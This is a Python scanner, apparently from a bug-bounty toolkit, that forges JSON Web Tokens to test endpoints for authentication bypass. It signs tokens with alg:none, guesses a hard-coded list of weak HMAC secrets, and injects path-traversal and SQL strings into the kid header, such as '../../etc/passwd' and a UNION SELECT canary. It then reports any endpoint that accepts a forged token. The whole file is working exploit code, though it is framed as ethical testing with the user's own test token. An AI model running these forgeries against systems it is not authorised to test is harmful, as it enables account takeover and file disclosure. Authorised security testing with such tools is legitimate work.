#!/usr/bin/env python3
"""
patrol-jwt-flaws — scanner #50.

Probes endpoints that consume JWTs for the three classic JWT vulnerability
patterns:

  1. alg:none acceptance — server accepts an unsigned token with alg='none'
     → trivial authentication bypass (forge any user).

  2. Weak HMAC secret — server uses a guessable HMAC secret (common defaults
     like 'secret', 'jwt-secret', 'changeme', 'your-256-bit-secret', etc.)
     → forge tokens for any user once secret is known.

  3. kid (key-id) header injection — server reads `kid` from token header
     and uses it in a file path / SQL query / etc. without sanitization
     → file read, SQL injection, or signature bypass.

Top-tier discovery pattern (per HackerOne reports):
  - JWT alg:none bypass on auth endpoint   $5K-$25K
  - JWT weak HMAC secret crack             $5K-$15K
  - JWT kid injection → file disclosure    $10K-$25K

Method (ETHICAL — Lictor never modifies real user sessions):
  1. Probe target endpoints (provided JWT-issuing URL or candidate paths).
  2. Capture the issued JWT (if endpoint hands them out anonymously) OR
     accept a researcher-supplied test JWT.
  3. Forge variant tokens:
     - alg:none variant (re-encode header, drop signature)
     - HMAC-signed variant with each of N candidate secrets
     - kid-injected variant (path traversal: ../../../dev/null = empty key)
  4. Submit forged token to a verify-endpoint or protected resource.
  5. Classify response: accepted (vuln) / rejected (safe) / ambiguous.

We use a TEST account / TEST JWT supplied by the user — never another
real user's session token.

Usage:
  patrol-jwt-flaws.py --endpoints jwt-endpoints.txt --test-jwt 'eyJhbG...'
"""
from __future__ import annotations
import argparse, base64, hashlib, hmac, json, time, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from datetime import datetime, timezone
from pathlib import Path

UA = "Lictor-JWTPatrol/0.1 (+https://lictor-ai.com)"

# Top-100 weak HMAC secrets commonly seen in wild + framework defaults.
WEAK_HMAC_SECRETS = [
    "secret", "secret123", "jwt-secret", "jwt_secret", "jwtsecret",
    "changeme", "change-me", "change_me", "default", "default-secret",
    "your-256-bit-secret", "your-secret-key", "supersecret", "super-secret",
    "supersecretkey", "your-secret", "test", "testing", "test-secret",
    "dev", "development", "dev-secret", "production", "prod",
    "admin", "admin123", "root", "password", "password123",
    "key", "private-key", "private_key", "api-secret", "api_secret",
    "MyVerySecret", "verysecret", "kahkahkah", "mysecretkey",
    "abcdef", "1234567890", "qwertyuiop",
    "jwt", "auth", "auth-secret", "auth_secret",
    "node-secret", "express-secret", "nestjs-secret", "django-secret",
    "rails-secret", "flask-secret", "laravel-secret",
    "abc123", "letmein", "p@ssw0rd", "p4ssw0rd",
    "shhh", "shhhh", "shhhhh", "shhhhhh",
    "secretsecret", "JWT", "JWT_SECRET",
    "0123456789", "9876543210",
]

# kid header injection payloads
KID_INJECTION_PAYLOADS = [
    "../../../../../../../dev/null",       # empty file → empty key → may bypass
    "../../../../../../../etc/passwd",     # file read attempt
    "/dev/null",                            # absolute path to empty
    "1' UNION SELECT 'x",                  # SQL injection canary
    "../../../../var/log/auth.log",        # log file read
    "",                                     # empty kid
    "null",                                 # literal "null"
]

@dataclass
class JWTFinding:
    endpoint: str
    test_kind: str        # "alg_none" / "weak_hmac" / "kid_injection"
    payload_meta: str
    forged_token_redacted: str
    response_status: int
    classification: str   # "accepted_vuln" / "rejected_safe" / "ambiguous"
    response_snippet: str = ""

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def parse_jwt(token: str):
    parts = token.split(".")
    if len(parts) != 3: return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None

def forge_alg_none(header: dict, payload: dict) -> str:
    h = dict(header); h["alg"] = "none"
    return f"{b64url(json.dumps(h, separators=(',', ':')).encode())}.{b64url(json.dumps(payload, separators=(',', ':')).encode())}."

def forge_hmac(header: dict, payload: dict, secret: str, alg: str = "HS256") -> str:
    h = dict(header); h["alg"] = alg
    signing_input = f"{b64url(json.dumps(h, separators=(',', ':')).encode())}.{b64url(json.dumps(payload, separators=(',', ':')).encode())}"
    if alg == "HS256":
        sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    elif alg == "HS384":
        sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha384).digest()
    else:
        sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha512).digest()
    return f"{signing_input}.{b64url(sig)}"

def forge_kid_injection(header: dict, payload: dict, kid_payload: str, secret: str = "") -> str:
    h = dict(header); h["kid"] = kid_payload; h["alg"] = "HS256"
    return forge_hmac(h, payload, secret).replace(h.get("alg", "HS256"), "HS256")

def probe_endpoint(url: str, token: str, timeout: int = 10):
    req = urllib.request.Request(url, headers={
        "User-Agent": UA,
        "Authorization": f"Bearer {token}",
        "Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(4096).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try: b = e.read(4096).decode("utf-8", "replace")
        except Exception: b = ""
        return e.code, b
    except Exception:
        return None, None

def classify(status: int | None, body: str | None) -> str:
    if status is None or body is None: return "ambiguous"
    blow = body.lower()
    if status in (401, 403): return "rejected_safe"
    if any(p in blow for p in ("invalid token", "invalid signature", "jwt expired",
                                 "unauthorized", "unauthenticated", "bad token")):
        return "rejected_safe"
    if status == 200: return "accepted_vuln"  # forged token accepted!
    return "ambiguous"

def test_endpoint(endpoint: str, test_jwt: str) -> list[JWTFinding]:
    parsed = parse_jwt(test_jwt)
    if not parsed:
        return [JWTFinding(endpoint=endpoint, test_kind="parse",
                            payload_meta="invalid_jwt_input", forged_token_redacted="",
                            response_status=0, classification="ambiguous",
                            response_snippet="supplied --test-jwt is not a valid JWT")]
    header, payload, _ = parsed
    findings = []

    # Test 1: alg:none
    forged = forge_alg_none(header, payload)
    time.sleep(1)
    status, body = probe_endpoint(endpoint, forged)
    findings.append(JWTFinding(
        endpoint=endpoint, test_kind="alg_none",
        payload_meta=f"header.alg=none kept-payload-sub={payload.get('sub','?')}",
        forged_token_redacted=forged[:25] + "..." + forged[-10:],
        response_status=status or 0,
        classification=classify(status, body),
        response_snippet=(body or "")[:200].replace("\n", " ")))

    # Test 2: weak HMAC secrets
    for secret in WEAK_HMAC_SECRETS[:20]:  # cap to avoid hammering
        forged = forge_hmac(header, payload, secret)
        time.sleep(0.8)
        status, body = probe_endpoint(endpoint, forged)
        cls = classify(status, body)
        if cls == "accepted_vuln":
            findings.append(JWTFinding(
                endpoint=endpoint, test_kind="weak_hmac",
                payload_meta=f"secret={secret!r}",
                forged_token_redacted=forged[:25] + "..." + forged[-10:],
                response_status=status, classification=cls,
                response_snippet=(body or "")[:200].replace("\n", " ")))
            break  # found the secret — stop trying more

    # Test 3: kid header injection
    for kid_val in KID_INJECTION_PAYLOADS:
        forged = forge_kid_injection(header, payload, kid_val)
        time.sleep(0.8)
        status, body = probe_endpoint(endpoint, forged)
        cls = classify(status, body)
        if cls == "accepted_vuln" or (status == 500 and any(w in (body or "").lower()
                                                              for w in ("file", "no such", "syntax"))):
            findings.append(JWTFinding(
                endpoint=endpoint, test_kind="kid_injection",
                payload_meta=f"kid={kid_val!r}",
                forged_token_redacted=forged[:25] + "..." + forged[-10:],
                response_status=status, classification="accepted_vuln" if cls == "accepted_vuln" else "ambiguous",
                response_snippet=(body or "")[:200].replace("\n", " ")))
    return findings

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--endpoints", required=True,
                     help="newline-delimited list of JWT-protected endpoint URLs")
    ap.add_argument("--test-jwt", required=True,
                     help="JWT issued for a TEST account YOU control (not someone else's session)")
    ap.add_argument("--threads", type=int, default=3,
                     help="Low concurrency — this scanner submits crafted tokens")
    ap.add_argument("--ledger", default="/Users/raffa/Lictor/v3/ledgers/jwt-flaws.jsonl")
    args = ap.parse_args()

    endpoints = [e.strip() for e in Path(args.endpoints).read_text().splitlines() if e.strip()]
    parsed = parse_jwt(args.test_jwt)
    if not parsed:
        print("[!] --test-jwt is not a valid JWT (expected 3 base64url segments).")
        return
    print(f"[+] Test JWT parsed. Subject: {parsed[1].get('sub','(none)')} "
          f"Issuer: {parsed[1].get('iss','(none)')}")
    print(f"[+] Probing {len(endpoints)} endpoints with alg:none + {len(WEAK_HMAC_SECRETS[:20])} "
          f"weak HMAC secrets + {len(KID_INJECTION_PAYLOADS)} kid-injection payloads")
    print(f"[+] ETHICS: ONLY uses YOUR test-account JWT — never another user's session")

    Path(args.ledger).parent.mkdir(parents=True, exist_ok=True)
    n_vuln, n_safe, n_ambig = 0, 0, 0
    with open(args.ledger, "a") as ledger, \
         ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(test_endpoint, e, args.test_jwt): e for e in endpoints}
        for i, fut in enumerate(as_completed(futures), 1):
            ep = futures[fut]
            try:
                findings = fut.result()
            except Exception as e:
                print(f"  [{i}/{len(endpoints)}] {ep} EXC: {e}")
                continue
            for f in findings:
                ledger.write(json.dumps(asdict(f)) + "\n")
                ledger.flush()
                if f.classification == "accepted_vuln":
                    n_vuln += 1
                    print(f"  [{i}/{len(endpoints)}] {ep}  🔴 {f.test_kind} ACCEPTED  ({f.payload_meta})")
                elif f.classification == "rejected_safe": n_safe += 1
                else: n_ambig += 1

    print(f"\n[+] Done. accepted_vuln={n_vuln}  rejected_safe={n_safe}  ambiguous={n_ambig}")
    print(f"[+] Ledger: {args.ledger}")
    print(f"[+] 🔴 accepted_vuln findings = forged-JWT was accepted → ATO / authn bypass.")

if __name__ == "__main__":
    main()
